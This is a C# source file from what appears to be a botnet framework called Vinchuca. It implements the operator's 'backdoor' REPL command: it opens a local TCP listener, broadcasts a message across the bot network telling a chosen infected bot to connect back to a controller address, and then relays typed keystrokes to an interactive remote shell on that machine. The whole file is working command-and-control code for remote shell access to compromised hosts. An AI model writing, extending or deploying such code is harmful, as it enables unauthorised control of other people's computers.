using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Mono.Options;
using Vinchuca;
using Vinchuca.Network;
using Vinchuca.Network.Protocol.Messages.Command;

namespace REPL.Commands
{
    class BackdoorCommand : Command
    {
        private readonly Agent _agent;
        private readonly CommandLineReader _repl;
        public bool ShowHelp { get; set; }
        public string BotId { get; set; }

        public BackdoorCommand(Agent agent, CommandLineReader repl)
            : base("backdoor", "Opens a session with a remote agent to execute commands.")
        {
            _agent = agent;
            _repl = repl;
            Options = new OptionSet() {
                "usage: backdoor --bot:identifier",
                "",
                "Opens a session with a remote agent to execute shell commands.",
                "eg: backdoor --bot:028d9a9a9b76a755f6262409d86c7e05",
                { "bot=",   "{bot} the bot identifier to connect with", x => BotId = x },
                { "help|h|?","Show this message and exit.", v => ShowHelp = v != null },
            };
            _repl.AddAutocompletionWords("backdoor", "--bot");
        }


        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp)
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 0;
                }
                if (string.IsNullOrEmpty(BotId))
                {
                    Console.WriteLine("commands: Missing required argument `--bot=BOT-IDENTIFIER`.");
                    Console.WriteLine("commands: Use `help backdoor` for details.");
                    return 1;
                }
                var port = new Random().Next(33000, 33999);
                var serverEndpoint = new IPEndPoint(IPAddress.Loopback, port);
                var server = new TcpListener(serverEndpoint);
                server.Start();

                var backdoorMessage = new BackdoorMessage()
                {
                    TargetBotId = BotIdentifier.Parse(BotId),
                    ControllerEndpoint = new IPEndPoint(IPAddress.Parse("10.0.2.2"), port)
                };
                _agent.MessagesManager.Broadcast(backdoorMessage, 6);



                var client = server.AcceptTcpClient();
                var stream = client.GetStream();

                var writer = new StreamWriter(stream) { AutoFlush = true };
                var reader = new StreamReader(stream);

                ThreadPool.QueueUserWorkItem(s1 =>
                {
                    var array = new char[1024];
                    try
                    {
                        int count;
                        while ((count = reader.Read(array, 0, array.Length)) != 0)
                        {
                            Console.Write(new string(array, 0, count));
                        }
                    }
                    catch (Exception e)
                    {
                        // ignored
                    }
                });

                ConsoleKeyInfo k;
                var cursorLeft = 0;
                while (true)
                {
                    k = Console.ReadKey(true);
                    writer.Write(k.KeyChar);
                    Console.Write(k.KeyChar.ToString());
                    if (k.Key == ConsoleKey.Enter)
                    {
                        Console.CursorLeft -= cursorLeft;
                        cursorLeft = 0;
                        writer.WriteLine();
                    }
                    else
                    {
                        cursorLeft++;
                    }
                }

                client.Close();
                server.Stop();
                return 0;
            }
            catch (Exception e)
            {
                //                _repl.Console.WriteLine("commands: {0}", CommandDemo.Verbosity >= 1 ? e.ToString() : e.Message);
                return 1;
            }
        }
    }
}
